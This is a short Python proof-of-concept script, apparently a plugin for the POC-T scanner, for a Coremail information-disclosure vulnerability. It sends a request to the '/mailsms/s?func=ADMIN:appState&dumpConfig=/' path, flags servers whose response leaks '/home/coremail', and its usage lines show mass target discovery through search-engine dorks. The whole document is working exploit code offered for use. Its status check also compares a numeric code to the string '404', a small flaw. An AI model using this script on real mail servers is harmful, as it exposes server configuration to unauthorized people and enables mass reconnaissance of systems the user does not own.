#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = 24''

"""
Coremail 信息泄漏漏洞

Version:
2.3.5-2.3.31, 2.5-2.5.10

Usage:
python POC-T.py -s coremail -aG "inurl:mail" --gproxy "http 127.0.0.1 1080"
python POC-T.py -s coremail -aZ "app:coremail"
python POC-T.py -s coremail -iF FILE.txt
"""

import requests
import random


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    try:
        url = url + "/mailsms/s?func=ADMIN:appState&dumpConfig=/"       
        r = requests.get(url)   
        
        if (r.status_code != '404') and ("/home/coremail" in r.text):
            return '[mailsms is vulnerable]: ' + url
        else:
            return False
    except Exception:
        return False
